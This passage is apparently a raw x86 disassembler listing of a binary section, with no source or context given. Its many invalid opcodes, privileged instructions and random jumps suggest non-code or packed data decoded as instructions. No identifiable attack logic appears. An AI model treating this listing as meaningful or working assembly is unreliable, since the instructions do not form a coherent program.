  427ddf:	dec    esi
  427de0:	jbe    0x427de2
  427de2:	push   edx
  427de3:	push   eax
  427de4:	test   al,0x30
  427de6:	cmp    bl,BYTE PTR [edx+0x151da055]
  427dec:	xchg   BYTE PTR [ebp+0x74],dl
  427def:	push   0xffffff99
  427df1:	and    al,0xdc
  427df3:	pop    esp
  427df4:	or     cl,BYTE PTR [ecx*1-0x696007d1]
  427dfb:	pop    esp
  427dfc:	ins    BYTE PTR es:[edi],dx
  427dfd:	cmp    BYTE PTR [eax+0x29],cl
  427e00:	fdiv   QWORD PTR [esi]
  427e02:	(bad)  
  427e04:	cli    
  427e05:	fild   WORD PTR [esi-0x45]
  427e08:	pop    ds
  427e09:	xor    al,0xca
  427e0b:	push   ebx
  427e0c:	je     0x427e66
  427e0e:	inc    ebx
  427e0f:	add    BYTE PTR [ecx+0x14d8c1e8],dh
  427e15:	in     al,0x9
  427e17:	inc    esi
  427e18:	sub    eax,0x7a231ee
  427e1d:	ins    DWORD PTR es:[edi],dx
  427e1e:	es adc al,0xb2
  427e21:	repz cmp DWORD PTR [eax],edi
  427e24:	push   ebx
  427e25:	dec    BYTE PTR [eax+0x63c502a5]
  427e2b:	push   ss
  427e2c:	fmul   QWORD PTR [edx+0x25012a3]
  427e32:	add    eax,0x3c4e5846
  427e37:	dec    esp
  427e38:	xchg   edi,eax
  427e39:	dec    edx
  427e3a:	das    
  427e3b:	push   0x8
  427e3d:	dec    edi
  427e3e:	dec    edx
  427e3f:	mov    dl,BYTE PTR [ebx+0x56426a00]
  427e45:	xor    BYTE PTR [edx-0x6b],bl
  427e48:	and    edx,ecx
  427e4a:	daa    
  427e4b:	out    dx,al
  427e4c:	(bad)  
  427e4d:	icebp  
  427e4e:	mov    DWORD PTR [eax+0x61],ebx
  427e51:	retf   0x20b2
  427e54:	je     0x427e14
  427e56:	and    al,0x43
  427e58:	out    0x6d,al
  427e5a:	aad    0x91
  427e5c:	pop    esi
  427e5d:	imul   esp,DWORD PTR [esi-0x5a],0x19
  427e61:	cli    
  427e62:	fwait
  427e63:	add    al,ch
  427e65:	xchg   ebx,eax
  427e66:	adc    eax,0x7a0d15b4
  427e6b:	rcr    DWORD PTR [edx-0x638f24d0],cl
  427e71:	mul    BYTE PTR [edx]
  427e73:	inc    edi
  427e74:	inc    eax
  427e75:	repz ja 0x427e2e
  427e78:	add    BYTE PTR [bx+di+0x4d],bh
  427e7d:	jo     0x427e71
  427e7f:	ret    
  427e80:	call   0x15127f81
  427e85:	mov    ah,0x91
  427e87:	pop    eax
  427e88:	jnp    0x427eb4
  427e8a:	inc    edi
  427e8b:	ud2    
  427e8d:	lock or eax,0xadc44cbc
  427e93:	xchg   edx,eax
  427e94:	ror    BYTE PTR es:[edx],1
  427e97:	dec    esi
  427e98:	adc    BYTE PTR [edx-0x724de71f],ch
  427e9e:	push   cs
  427e9f:	jnp    0x427f17
  427ea1:	packssdw mm0,QWORD PTR [ebx-0x15]
  427ea5:	pushf  
  427ea6:	cli    
  427ea7:	push   ss
  427ea8:	cli    
  427ea9:	out    0xa5,al
  427eab:	mov    dh,0xa
  427ead:	xchg   ecx,eax
  427eae:	ins    DWORD PTR es:[edi],dx
  427eaf:	mov    dh,0x11
  427eb1:	jo     0x427f10
  427eb3:	cmp    BYTE PTR [eax+0x4c],bl
  427eb6:	add    al,0x4
  427eb8:	sub    BYTE PTR [esp+edx*8-0x38af7afc],cl
  427ebf:	mov    dh,0xbf
  427ec1:	fcom   DWORD PTR [esi]
  427ec3:	fcmovb st,st(1)
  427ec5:	mov    ch,BYTE PTR [esi]
  427ec7:	fucomi st,st(0)
  427ec9:	out    0xa9,al
  427ecb:	mov    dl,0xe0
  427ecd:	leave  
  427ece:	(bad)  
  427ecf:	xchg   esp,eax
  427ed0:	and    ebp,DWORD PTR [esp+edx*1-0x27]
  427ed4:	stos   BYTE PTR es:[edi],al
  427ed5:	es jo  0x427f0b
  427ed8:	in     al,0x2d
  427eda:	sub    DWORD PTR [edx-0x80],0x18
  427ede:	xchg   edi,eax
  427edf:	(bad)
  427ee4:	jl     0x427f62
  427ee6:	mov    ?,WORD PTR [ebx]
  427ee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ee9:	je     0x427e93
  427eeb:	sub    BYTE PTR [ebx+0x63],0x1e
  427eef:	pop    es
  427ef0:	push   es
  427ef1:	ins    BYTE PTR es:[edi],dx
  427ef2:	jp     0x427e99
  427ef4:	mov    cl,ch
  427ef6:	push   esi
  427ef7:	dec    esp
  427ef8:	bound  esi,QWORD PTR [edi]
  427efa:	adc    BYTE PTR [esi+0x10f442de],bh
  427f00:	push   eax
  427f01:	loopne 0x427ea7
  427f03:	mov    WORD PTR cs:[edi],cs
  427f06:	pushf  
  427f07:	pop    ax
  427f09:	dec    esp
  427f0a:	xor    al,0xd8
  427f0c:	(bad)  
  427f0d:	push   0x95d07052
  427f12:	les    ebx,FWORD PTR [edx]
  427f14:	jb     0x427f46
  427f16:	cwde   
  427f17:	mov    ds:0xcfc0de40,eax
  427f1c:	mov    edx,0x80a0fe50
  427f21:	test   eax,0x2e1c5aed
  427f26:	mov    dl,0x65
  427f28:	ror    dh,1
  427f2a:	xor    BYTE PTR [edi-0x5c],bl
  427f2d:	fisub  DWORD PTR [edx-0x7d]
  427f30:	jmp    0x427f7a
  427f32:	je     0x427f5f
  427f34:	add    DWORD PTR [eax],0x38
  427f37:	ins    DWORD PTR es:[edi],dx
  427f38:	push   es
  427f39:	jle    0x427ee3
  427f3b:	lods   eax,DWORD PTR ds:[esi]
  427f3c:	mov    eax,0x1e707540
  427f41:	mov    dh,BYTE PTR [edi+0x3a6a8712]
  427f47:	cmp    ah,BYTE PTR [eax]
  427f49:	push   0x2
  427f4b:	dec    ecx
  427f4c:	mov    dl,0x87
  427f4e:	sbb    BYTE PTR [ebp+eax*2+0x1a5d5273],0xab
  427f56:	test   al,0xac
  427f58:	sbb    al,0xe2
  427f5a:	add    bl,bl
  427f5c:	inc    ebp
  427f5d:	inc    esi
  427f5e:	(bad)  
  427f5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f60:	pop    ecx
  427f61:	add    BYTE PTR [edi+0x46],ah
  427f64:	leave  
  427f65:	in     al,0x38
  427f67:	ret    0xa34b
  427f6a:	cli    
  427f6b:	out    dx,eax
  427f6c:	jo     0x427fbb
  427f6e:	pop    ds
  427f6f:	pusha  
  427f70:	shl    BYTE PTR [eax+0x1b],1
  427f73:	lods   al,BYTE PTR ds:[esi]
  427f74:	leave  
  427f75:	mov    ds:0x41a49a61,al
  427f7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f7b:	push   edx
  427f7c:	and    bl,BYTE PTR [ecx]
  427f7e:	push   esi
  427f7f:	mov    ecx,0x9ae31e4e
  427f84:	ds loopne 0x427f8c
  427f87:	dec    ebp
  427f88:	outs   dx,DWORD PTR ds:[esi]
  427f89:	dec    ebp
  427f8a:	jbe    0x427fbc
  427f8c:	push   ss
  427f8d:	jbe    0x427fc5
  427f8f:	add    BYTE PTR [esi-0x6],bh
  427f92:	push   edx
  427f93:	not    bh
  427f95:	push   eax
  427f96:	dec    ebx
  427f97:	in     eax,dx
  427f98:	mov    al,0xac
  427f9a:	sub    BYTE PTR [eax],bl
  427f9c:	int3   
  427f9d:	dec    ebp
  427f9e:	cmp    BYTE PTR [eax+0x18545576],bl
  427fa4:	pushf  
  427fa5:	jbe    0x427f87
  427fa7:	mov    al,0x42
  427fa9:	popf   
  427faa:	rol    BYTE PTR [edx+0x6c1680fa],1
  427fb0:	ret    
  427fb1:	jae    0x427f3b
  427fb3:	and    DWORD PTR [esi],0xffffff84
  427fb6:	or     bl,BYTE PTR [edx-0x27e4e9a6]
  427fbc:	and    DWORD PTR [esi+0x604d1d94],eax
  427fc2:	mov    ah,0xf1
  427fc4:	xor    al,0x2e
  427fc6:	push   esi
  427fc7:	or     ch,BYTE PTR [esi+0x1a804030]
  427fcd:	mov    esi,0xa4cc78ac
  427fd2:	push   eax
  427fd3:	stos   BYTE PTR es:[edi],al
  427fd4:	test   BYTE PTR [ecx-0x2c],0x66
  427fd8:	push   esp
  427fd9:	push   edx
  427fda:	dec    ebp
  427fdb:	jmp    DWORD PTR [edx+0x3a7c3906]
  427fe1:	mov    esi,0x18461584
  427fe6:	ja     0x427f8a
  427fe8:	shl    BYTE PTR [esi],0xb5
  427feb:	or     BYTE PTR [edx],0x35
  427fee:	sub    ch,BYTE PTR [esi]
  427ff0:	pop    edi
  427ff1:	inc    esp
  427ff2:	jl     0x427ffe
  427ff4:	mov    ah,0xcd
  427ff6:	(bad)  
  427ff7:	cmc    
  427ff8:	xchg   ah,dh
  427ffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ffc:	cld    
  427ffd:	add    BYTE PTR [edi],ch
  427fff:	sahf   
  428000:	jne    0x42802a
  428002:	add    cl,al
  428004:	dec    esp
  428005:	mov    edx,0xb2612a10
  42800a:	scas   al,BYTE PTR es:[edi]
  42800b:	pop    ds
  42800c:	mov    esp,0x33561ccc
  428011:	ins    DWORD PTR es:[edi],dx
  428012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428013:	xchg   esp,eax
  428014:	shr    dh,0x64
  428017:	xchg   ebx,eax
  428018:	cli    
  428019:	mov    eax,ds:0x7094e8e6
  42801e:	jl     0x427fe6
  428020:	cli    
  428021:	push   0x98741416
  428026:	sar    BYTE PTR [eax+ecx*1],0x90
  42802a:	loop   0x428028
  42802c:	(bad)  
  42802e:	sub    ch,BYTE PTR [edx]
  428030:	fidiv  DWORD PTR ds:0x4bca5550
  428036:	jbe    0x4280b0
  428038:	and    ch,BYTE PTR [ebx+0x1c]
  42803b:	or     BYTE PTR [ebx],cl
  42803d:	or     ch,BYTE PTR [ecx+edx*8-0x6a]
  428041:	inc    eax
  428042:	push   edx
  428043:	out    dx,al
  428044:	dec    BYTE PTR [esi-0x29a93ebe]
  42804a:	mov    bl,0x6e
  42804c:	push   edx
  42804d:	cmp    BYTE PTR [ebx-0x6cafab88],ch
  428053:	ins    DWORD PTR es:[edi],dx
  428054:	mov    eax,0x820469e4
  428059:	es xor al,0xb0
  42805c:	test   al,0xab
  42805e:	sbb    eax,0x2671dcfe
  428063:	jmp    0x57df225a
  428068:	xchg   ecx,eax
  428069:	inc    edx
  42806a:	push   0xe6929ed3
  42806f:	pop    ds
  428070:	mov    esp,0x436027ae
  428075:	scas   eax,DWORD PTR es:[edi]
  428076:	ret    0xdc7c
  428079:	jmp    0xd4c7:0x559adaf3
  428080:	dec    esp
  428081:	std    
  428082:	outs   dx,BYTE PTR ds:[esi]
  428083:	stc    
  428084:	jmp    0xfb41:0x4544ff90
  42808b:	nop
  42808c:	pop    edx
  42808d:	loopne 0x428023
  42808f:	stc    
  428090:	cmp    al,0x67
  428092:	jbe    0x428064
  428094:	sar    BYTE PTR [edx-0x7effac02],1
  42809a:	pop    ebp
  42809b:	add    BYTE PTR ds:0x7ba0b5ec,cl
  4280a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280a2:	or     BYTE PTR [edx],ch
  4280a4:	mov    ch,0x55
  4280a6:	push   eax
  4280a7:	scas   al,BYTE PTR es:[edi]
  4280a8:	aaa    
  4280a9:	data16 aam 0x80
  4280ac:	(bad)  
  4280ad:	lock stos BYTE PTR es:[edi],al
  4280af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280b0:	mov    al,BYTE PTR [ebp+0x59528f88]
  4280b6:	div    BYTE PTR [ebx+0x4b]
  4280b9:	add    al,bh
  4280bb:	aad    0x8e
  4280bd:	es xchg ebx,eax
  4280bf:	cwde   
  4280c0:	and    al,BYTE PTR [ecx-0x22]
  4280c3:	mov    ds:0xd825180a,eax
  4280c8:	stos   BYTE PTR es:[edi],al
  4280c9:	add    al,BYTE PTR [edx-0x16]
  4280cc:	dec    eax
  4280cd:	cmp    eax,0x5415fa2c
  4280d2:	push   ebp
  4280d3:	pop    ebp
  4280d4:	pop    eax
  4280d5:	cmp    eax,DWORD PTR [eax]
  4280d7:	jmp    esp
  4280d9:	mov    ah,0x6
  4280db:	xor    BYTE PTR ss:[ecx+0x6861555],bl
  4280e2:	(bad)  
  4280e3:	mov    esp,0x54511cbc
  4280e8:	or     BYTE PTR [edx+0x54],0x34
  4280ec:	mov    bh,0xbd
  4280ee:	mov    ?,WORD PTR [esi+0x0]
  4280f1:	shl    BYTE PTR [edx-0x42],cl
  4280f4:	push   esp
  4280f5:	xor    BYTE PTR [ecx],cl
  4280f7:	sub    al,0x2a
  4280f9:	mov    al,0x8f
  4280fb:	retf   0xc218
  4280fe:	fcmove st,st(0)
  428100:	sub    eax,DWORD PTR [edx]
  428102:	adc    eax,DWORD PTR [eax]
  428104:	jnp    0x42810a
  428106:	cld    
  428107:	daa    
  428108:	sub    dh,0x54
  42810b:	test   al,0xa2
  42810d:	mov    ds:0x1cf65e8e,al
  428112:	bound  ebp,QWORD PTR [ecx-0x14]
  428115:	adc    eax,0x38685041
  42811a:	fiadd  DWORD PTR [eax]
  42811c:	xor    al,0xa8
  42811e:	adc    eax,0xeb60d82
  428123:	rcr    BYTE PTR [eax],1
  428125:	lods   al,BYTE PTR ds:[esi]
  428126:	sahf   
  428127:	mov    ds,WORD PTR ds:0xc79be236
  42812d:	aas    
  42812e:	adc    DWORD PTR ds:0xba12aeee,0x45003aa2
  428138:	mov    ah,BYTE PTR [ecx-0x59aeac9e]
  42813e:	enter  0xa693,0x2
  428142:	xlat   BYTE PTR ds:[ebx]
  428143:	push   edx
  428144:	dec    eax
  428145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428146:	arpl   WORD PTR [edx+0x660286a3],bp
  42814c:	cmc    
  42814d:	cwde   
  42814e:	ret    
  42814f:	(bad)  
  428150:	inc    eax
  428151:	inc    ebx
  428152:	or     DWORD PTR [edx+0x2c8940ca],0xc26a0d0d
  42815c:	lods   al,BYTE PTR ds:[esi]
  42815d:	loop   0x428103
  42815f:	test   BYTE PTR [eax+0x2b45ae31],al
  428165:	push   0xef54ddd0
  42816a:	push   edx
  42816b:	pushf  
  42816c:	pop    eax
  42816d:	xchg   BYTE PTR [eax+0x10c14120],cl
  428173:	fld    DWORD PTR [edx+0x17]
  428176:	jmp    0xde16:0xc0b413c6
  42817d:	or     dl,bl
  42817f:	inc    eax
  428180:	int3   
  428181:	fisttp DWORD PTR [ecx+0x102b45e6]
  428187:	loopne 0x42813e
  428189:	sub    DWORD PTR [edx],ecx
  42818b:	sbb    BYTE PTR [eax-0x6889d178],bh
  428191:	shl    DWORD PTR [ecx+0x6d],1
  428194:	in     eax,0x94
  428196:	cli    
  428197:	addr16 (bad) 
  428199:	fsubr  DWORD PTR [ebx-0x2bf8f6c6]
  42819f:	push   es
  4281a0:	stos   BYTE PTR es:[edi],al
  4281a1:	xchg   edi,eax
  4281a2:	mov    ds,WORD PTR [esi+0x61438af2]
  4281a8:	test   DWORD PTR [eax+0xe0fed6a],esi
  4281ae:	dec    esi
  4281af:	sub    BYTE PTR [eax+ecx*2-0x7c],cl
  4281b3:	mov    cs,WORD PTR [ebx+0x7e]
  4281b6:	xchg   esp,eax
  4281b7:	test   ax,0xbff9
  4281bb:	ror    DWORD PTR [edx+0x814c86],0x7e
  4281c2:	xchg   DWORD PTR [eax],eax
  4281c4:	mov    eax,ds:0xbf1300a8
  4281c9:	cdq    
  4281ca:	dec    edi
  4281cb:	push   eax
  4281cc:	sar    DWORD PTR [edi],0x64
  4281cf:	in     al,dx
  4281d0:	enter  0xbd00,0x24
  4281d4:	mov    edx,0x6de56250
  4281d9:	sub    BYTE PTR [eax+0x49],dl
  4281dc:	dec    esi
  4281dd:	mov    ah,0x74
  4281df:	ret    0xc4cf
  4281e2:	add    edx,DWORD PTR [edx]
  4281e4:	clc    
  4281e5:	or     DWORD PTR [esi],esp
  4281e7:	mov    ds:0xc5062ca5,al
  4281ec:	push   cs
  4281ed:	rcr    esi,0x7d
  4281f0:	dec    eax
  4281f1:	fsub   st,st(7)
  4281f3:	shr    BYTE PTR [esi+edi*8-0x5fd1cad],cl
  4281fa:	ror    BYTE PTR [edi+0x0],1
  4281fd:	popf   
  4281fe:	add    DWORD PTR [esi+edi*4+0x1c231632],ecx
  428205:	test   BYTE PTR [edx+0xc],ch
  428208:	arpl   sp,cx
  42820a:	push   ds
  42820b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42820c:	xor    al,0x43
  42820e:	add    DWORD PTR [edx+0x5f],ebx
  428211:	jl     0x428259
  428213:	cmp    dh,ah
  428215:	cmp    BYTE PTR [edx],bh
  428217:	retf   
  428218:	sub    al,0xe8
  42821a:	rcl    BYTE PTR [esi+0x5e],1
  42821d:	adc    eax,0xfe7bee5
  428222:	mov    ebp,0x3589cd60
  428227:	pop    ebx
  428228:	cmc    
  428229:	or     al,0x9a
  42822b:	dec    ecx
  42822c:	jle    0x42827b
  42822e:	push   ebx
  42822f:	(bad)  
  428230:	call   0x3874:0x16c1b0dd
  428237:	pusha  
  428238:	jle    0x42826d
  42823a:	es or  bl,dl
  42823d:	and    ebp,DWORD PTR fs:[esi-0x181752d9]
  428244:	pop    ebp
  428245:	adc    ah,cl
  428247:	xchg   ebp,eax
  428248:	pop    eax
  428249:	push   0xad5de08
  42824e:	lock shl bl,cl
  428251:	add    BYTE PTR [edi+0x4],dl
  428254:	inc    ebx
  428255:	or     al,ah
  428257:	push   esi
  428258:	jle    0x428209
  42825a:	add    BYTE PTR [eax+0x2b6158a8],ah
  428260:	jl     0x4282ad
  428262:	mov    dh,0xc4
  428264:	dec    esp
  428265:	inc    esi
  428266:	add    eax,0x5b43594
  42826b:	in     eax,dx
  42826c:	pop    eax
  42826d:	mov    esi,0x365ebeab
  428272:	xor    eax,0x2f8352a4
  428277:	sub    BYTE PTR [edx+0x4d],bh
  42827a:	loop   0x42825a
  42827c:	neg    DWORD PTR [eax+0x13ba15]
  428282:	lock xor DWORD PTR [ecx-0x2fb4a2eb],esp
  428289:	stc    
  42828a:	sbb    ch,BYTE PTR [ecx-0x2a]
  42828d:	test   al,0x10
  42828f:	std    
  428290:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428291:	mov    esi,0x6bae6e
  428296:	xor    al,0x29
  428298:	sbb    bl,al
  42829a:	or     BYTE PTR [edx-0x7c],0xc2
  42829e:	and    al,ch
  4282a0:	nop
  4282a1:	mov    esp,0x68a6484e
  4282a6:	or     ecx,DWORD PTR [edx]
  4282a8:	mov    WORD PTR [eax],es
  4282aa:	pop    edx
  4282ab:	add    eax,0x4032778a
  4282b0:	push   0x82eba9a0
  4282b5:	and    bh,dh
  4282b7:	sahf   
  4282b8:	xchg   esi,eax
  4282b9:	pop    eax
  4282ba:	mov    bl,bl
  4282bc:	hlt    
  4282bd:	and    BYTE PTR ds:0xeb2cd30c,dh
  4282c3:	cli    
  4282c4:	sub    cl,al
  4282c6:	fsub   QWORD PTR [edx-0x22bbb072]
  4282cc:	cli    
  4282cd:	das    
  4282ce:	pop    ebx
  4282cf:	dec    eax
  4282d0:	fdiv   DWORD PTR [edx]
  4282d2:	add    eax,0xefb0add0
  4282d7:	mov    eax,0x8fc23704
  4282dc:	and    eax,0xab56d72
  4282e1:	push   ebx
  4282e2:	in     eax,dx
  4282e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4282e4:	inc    esi
  4282e5:	xor    dl,dh
  4282e7:	mov    esi,0x4aad1db0
  4282ec:	add    bl,BYTE PTR [edx-0x4e]
  4282ef:	jbe    0x4282b8
  4282f1:	jb     0x428296
  4282f3:	aas    
  4282f4:	out    dx,al
  4282f5:	addr16 mov ds:0xea81,al
  4282f9:	pusha  
  4282fa:	pop    ecx
  4282fb:	push   ss
  4282fc:	mov    ecx,0xa1514120
  428301:	scas   al,BYTE PTR es:[edi]
  428302:	or     eax,0xaa4cf2f8
  428307:	cs sub al,ch
  42830a:	mov    ch,0xa0
  42830c:	(bad)  
  42830d:	sbb    esp,DWORD PTR [esi+0x43]
  428310:	jmp    0x428311
  428312:	outs   dx,BYTE PTR ds:[esi]
  428313:	pushf  
  428314:	mov    eax,0x6d257803
  428319:	in     al,dx
  42831a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42831b:	xor    BYTE PTR [esi],al
  42831d:	mov    edi,ebx
  42831f:	push   0xffffffb1
  428321:	ret    0xf2f4
  428324:	ins    BYTE PTR es:[edi],dx
  428325:	pop    eax
  428326:	push   edx
  428327:	sub    BYTE PTR [ebx+0x16],0x9a
  42832b:	ss push ebp
  42832d:	(bad)  [ebx+0x40]
  428330:	pop    ebx
  428331:	pusha  
  428332:	retf   0xe65a
  428335:	pop    esi
  428336:	aad    0xb6
  428338:	cmc    
  428339:	adc    ebx,DWORD PTR [edx+0x64]
  42833c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42833d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42833e:	mov    dh,0x32
  428340:	repnz jecxz 0x4283a9
  428343:	or     ebp,esp
  428345:	daa    
  428346:	in     al,0x67
  428348:	lahf   
  428349:	jbe    0x428369
  42834b:	or     DWORD PTR [edx],0xd60d229a
  428351:	sbb    al,BYTE PTR [eax-0x57bfb4a]
  428357:	repz jl 0x4282ec
  42835a:	mov    edi,0x5437469
  42835f:	sbb    BYTE PTR [edx+ebx*4],bl
  428362:	clc    
  428363:	fs ins BYTE PTR es:[edi],dx
  428365:	xor    cl,BYTE PTR [ecx+0x44885ea8]
  42836b:	jns    0x42837d
  42836d:	ins    DWORD PTR es:[edi],dx
  42836e:	fdivrp st(0),st
  428370:	cld    
  428371:	fdiv   DWORD PTR [ebx+eax*1+0x5a]
  428375:	add    BYTE PTR [edi+esi*2],bl
  428378:	jp     0x428330
  42837a:	mov    ds:0xdeef3535,eax
  42837f:	dec    ebx
  428380:	xlat   BYTE PTR ds:[ebx]
  428381:	add    BYTE PTR [edi+0x7018166a],cl
  428387:	ds scas eax,DWORD PTR es:[edi]
  428389:	mov    al,0xa1
  42838b:	mov    eax,ds:0x7380d366
  428390:	out    0x74,al
  428392:	sub    esp,eax
  428394:	mov    DWORD PTR gs:[ecx],esp
  428397:	push   eax
  428398:	lock pusha 
  42839a:	fs ds jno 0x428322
  42839e:	cmp    dh,BYTE PTR [esi]
  4283a0:	stos   DWORD PTR es:[edi],eax
  4283a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283a2:	mov    al,0xec
  4283a4:	jecxz  0x428418
  4283a6:	(bad)  
  4283a8:	pop    eax
  4283a9:	jo     0x4283ab
  4283ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4283ac:	jbe    0x428422
  4283ae:	mov    ah,0x1e
  4283b0:	mov    eax,0xb44e1290
  4283b5:	cmp    al,0x7d
  4283b7:	imul   eax,DWORD PTR [ecx+0x6b],0x38
  4283bb:	inc    edx
  4283bc:	or     eax,0xc4a6426e
  4283c1:	mov    ds:0xc3009772,al
  4283c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283c7:	mov    cr3,esi
  4283ca:	mov    esi,0xd31a3ee4
  4283cf:	pop    edx
  4283d0:	mov    eax,ds:0x2e147658
  4283d5:	and    cl,dl
  4283d7:	add    ebp,0xf441a9a1
  4283dd:	or     BYTE PTR [eax],dh
  4283df:	jmp    0x22520ffe
  4283e4:	pop    esi
  4283e5:	jg     0x4283da
  4283e7:	stos   BYTE PTR es:[edi],al
  4283e8:	data16 jle 0x428445
  4283eb:	shr    BYTE PTR [esi],cl
  4283ed:	add    BYTE PTR [esi+eax*8],cl
  4283f0:	ja     0x4283f2
  4283f2:	adc    BYTE PTR [ecx+0x0],0xa
  4283f6:	inc    esi
  4283f7:	in     eax,dx
  4283f8:	enter  0x336b,0x2e
  4283fc:	bound  esi,QWORD PTR [ebx-0x23d16137]
  428402:	bound  ebp,QWORD PTR [ebp-0x13f24f28]
  428408:	mov    eax,0xd17ae8f1
  42840d:	cmp    dh,BYTE PTR [ebp+0x6b2eb5a1]
  428413:	add    al,0x90
  428415:	out    dx,al
  428416:	sahf   
  428417:	test   BYTE PTR [edx+0x2ab45e32],al
  42841d:	cli    
  42841e:	nop
  42841f:	mov    esi,0xee439e
  428424:	pop    esp
  428425:	fnstsw WORD PTR [esi+0x44]
  428428:	and    cl,dh
  42842a:	inc    esp
  42842b:	push   edx
  42842c:	inc    ebp
  42842d:	imul   ebx,DWORD PTR [esi+0x5d],0xffffffb8
  428431:	adc    esi,DWORD PTR [edx+0x2f8e679]
  428437:	push   ebp
  428438:	adc    esi,DWORD PTR [eax+0x6884c08c]
  42843e:	fiadd  WORD PTR [eax]
  428440:	xchg   BYTE PTR [edi+0x13e2b154],bh
  428446:	int3   
  428447:	(bad)  
  428448:	les    edi,FWORD PTR cs:[edi-0x78]
  42844c:	out    0x54,al
  42844e:	sbb    BYTE PTR [esi+0x5c],dh
  428451:	sahf   
  428452:	sub    al,BYTE PTR [eax]
  428454:	cmp    esi,esi
  428456:	lock cwde 
  428458:	jp     0x4283dc
  42845a:	or     BYTE PTR [eax+0x5255a8a1],ch
  428460:	inc    eax
  428461:	cs aaa 
  428463:	je     0x42847a
  428465:	(bad)  
  428466:	gs sbb eax,eax
  428469:	mov    ds:0xd842e0aa,al
  42846e:	dec    eax
  42846f:	rcl    ah,1
  428471:	sbb    bl,BYTE PTR [edx+0x1a85b0a8]
  428477:	sbb    al,0xf3
  428479:	(bad)  
  42847a:	fidivr WORD PTR [eax-0x7d597d3c]
  428480:	push   esi
  428481:	xor    bl,cl
  428483:	shr    BYTE PTR [ebp-0x6a],1
  428486:	mov    ds,WORD PTR [esi+0x62]
  428489:	int3   
  42848a:	or     eax,0x3ea6c407
  42848f:	les    esp,FWORD PTR [ecx]
  428491:	stos   BYTE PTR es:[edi],al
  428492:	shr    BYTE PTR [esp+edx*8],0x4
  428496:	sub    ch,0x10
  428499:	call   0x733f855c
  42849e:	pop    esp
  42849f:	and    al,0x7
  4284a1:	call   0x57138b9f
  4284a6:	mov    bl,0x5
  4284a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284a9:	clc    
  4284aa:	(bad)  
  4284ab:	pushf  
  4284ac:	and    al,BYTE PTR [eax]
  4284ae:	xchg   edi,eax
  4284af:	mov    WORD PTR [ebx],es
  4284b1:	sub    BYTE PTR [edx-0x6d],0x70
  4284b5:	mov    ah,0x7c
  4284b7:	push   es
  4284b8:	jne    0x428517
  4284ba:	push   ecx
  4284bb:	fwait
  4284bc:	add    BYTE PTR [esi-0x75e52929],ah
  4284c2:	sbb    ch,BYTE PTR [edx]
  4284c4:	adc    eax,0xbe355554
  4284c9:	cmp    BYTE PTR [esi+0x78],0x30
  4284cd:	mov    ds:0xb095ecf6,al
  4284d2:	inc    edx
  4284d3:	dec    ebp
  4284d4:	xor    BYTE PTR [esi+0x43a0f51c],bh
  4284da:	shl    DWORD PTR [ebx],1
  4284dc:	jmp    0x42850d
  4284de:	xchg   ebp,eax
  4284df:	(bad)  
  4284e1:	push   ebp
  4284e2:	aam    0x53
  4284e4:	(bad)  [ebp+ebx*2-0x63915f4a]
  4284eb:	outs   dx,DWORD PTR ds:[esi]
  4284ec:	adc    al,0x3a
  4284ee:	xor    dh,cl
  4284f0:	rcl    BYTE PTR [esi],1
  4284f2:	push   edi
  4284f3:	xchg   ebp,eax
  4284f4:	add    BYTE PTR [edx+0x30],ch
  4284f7:	inc    esp
  4284f8:	mov    al,0x57
  4284fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284fb:	data16 scas al,BYTE PTR es:[edi]
  4284fd:	or     eax,0x5a7e6686
  428502:	lods   eax,DWORD PTR ds:[esi]
  428503:	sbb    dh,BYTE PTR [edx]
  428505:	lea    ebp,[edx-0x32]
  428508:	inc    ecx
  428509:	mov    bl,0xd
  42850b:	dec    ebp
  42850c:	add    al,0xf4
  42850e:	ds jmp 0x42853e
  428511:	out    dx,al
  428512:	cs inc eax
  428514:	jle    0x4284f6
  428516:	or     BYTE PTR [eax+eax*2],0x71
  42851a:	mov    esi,0x50582040
  42851f:	push   eax
  428520:	rol    BYTE PTR [edx+0x12],cl
  428523:	(bad)
  428526:	adc    eax,eax
  428528:	mov    ah,0xa
  42852a:	xchg   ebp,eax
  42852b:	push   esp
  42852c:	ss out dx,al
  42852e:	nop
  42852f:	fdiv   QWORD PTR [esi]
  428531:	inc    esi
  428532:	iret   
  428533:	ret    0x8a8a
  428536:	push   edi
  428537:	hlt    
  428538:	mov    ds:0x4060073,eax
  42853d:	fisttp DWORD PTR [eax+0x6ac2f3c2]
  428543:	sbb    BYTE PTR [edi-0x70],0xb1
  428547:	pop    ds
  428548:	rcl    al,cl
  42854a:	mov    dh,0x60
  42854c:	push   ebp
  42854d:	inc    ecx
  42854e:	xor    edx,0xf27ebbd8
  428554:	fdivr  DWORD PTR [eax-0x6578bcfd]
  42855a:	mov    ds:0x2e9c9de4,eax
  42855f:	rep ins BYTE PTR es:[edi],dx
  428561:	sbb    eax,DWORD PTR [eax+0x5bcc9a2a]
  428567:	xchg   ebp,eax
  428568:	inc    esi
  428569:	pop    ss
  42856a:	add    BYTE PTR [ebx-0x539e236f],al
  428570:	mov    ecx,DWORD PTR [edx]
  428572:	mov    cl,BYTE PTR [edx]
  428574:	mov    edx,0x89bafc80
  428579:	cwde   
  42857a:	mov    esp,?
  42857c:	xchg   BYTE PTR [ecx-0x4b],al
  42857f:	or     dx,dx
  428582:	in     eax,dx
  428583:	scas   al,BYTE PTR es:[edi]
  428584:	xor    al,0xa
